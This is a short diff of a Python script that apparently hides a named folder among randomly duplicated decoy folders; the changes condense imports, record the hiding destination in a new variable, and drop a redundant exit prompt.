@@ -1,8 +1,4 @@
-import os
-import shutil
-import random
-import ctypes
-import sys
+import os,shutil,random,ctypes,sys
 
 #get into a drive
 #Duplicate the folders
@@ -84,12 +80,15 @@ def Duplicate(PATH,Name):
 
     duplicatedFolders = [folder for folder in os.listdir(PATH) if Name in folder]
     #print(duplicatedFolders)
+    HiderPath = ''
     
     max = len(duplicatedFolders) - 1
     if max > 1:
         index = random.randint(1,max)
         src = PATH + '/' + Name
-        dest = PATH + '/' + duplicatedFolders[index] + '/'
+        dest = PATH + '/' + duplicatedFolders[index]
+        HiderPath = dest
+        dest += '/'
         destination = shutil.move(src,dest)
     else:
         pass
@@ -104,7 +103,6 @@ if __name__ == "__main__":
     if is_admin():
         try:
             main()
-            input("Press Enter to exit...")
         except Exception as e:
             print(f"An error occurred: {e}")
             input("Press Enter to exit...")
